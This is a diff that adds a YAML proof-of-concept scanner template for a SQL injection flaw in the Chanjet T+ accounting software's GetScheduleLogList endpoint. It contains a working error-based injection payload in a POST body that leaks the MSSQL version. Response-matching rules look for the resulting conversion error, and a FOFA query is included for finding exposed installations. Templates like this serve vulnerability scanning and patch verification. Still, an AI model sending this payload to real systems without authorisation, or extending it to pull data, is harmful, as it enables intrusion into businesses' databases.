@@ -1,0 +1,25 @@
+id: poc-yaml-changjie-tplus-getscheduleloglist-sqli
+info:
+  name: 畅捷通 T+ GetScheduleLogList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList
+  headers:
+    Content-Type: application/json
+  data: '{"scheduleName":"'' AND 1 IN (SELECT @@version) AND ''1''=''1"}'
+  expression: 'status_code == 200 &&
+
+    contains(body,"在将 nvarchar 值") &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(body,"转换成数据类型 int 时失败")
+
+    '
+variables: {}
+transport: http
